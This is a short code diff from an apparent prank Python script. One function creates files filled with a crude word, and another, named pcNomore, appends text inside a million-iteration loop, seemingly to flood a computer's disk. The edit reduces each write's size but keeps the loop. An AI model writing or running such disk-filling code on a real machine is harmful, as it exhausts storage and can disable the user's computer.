@@ -23,9 +23,6 @@ def fileCreate():
             fp.write("Peen")
             fileNumA = fileNumA + 1
             file_list.append(file)
-
-
-
 def pcNomore():
     global file
     global fileNumB
@@ -36,7 +33,7 @@ def pcNomore():
         with open(file, 'a') as fp:
             fileNumB = fileNumB + 1
             for x in range(1000000):
-                fp.write(text * 100000)
+                fp.write(text)
 
 
 
